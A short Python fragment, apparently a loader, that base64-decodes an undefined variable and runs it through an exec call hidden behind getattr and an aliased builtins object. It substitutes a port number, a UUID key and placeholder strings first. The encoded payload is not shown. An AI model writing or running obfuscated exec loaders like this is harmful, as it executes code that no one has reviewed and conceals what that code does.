import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(7860))
    .replace("__key__", "1f6821bb-2633-45c8-9ec8-7289314a41ca")
    .replace("__vl__", "")
    .replace("__vm__", "")
    .replace("__tr__", "")
)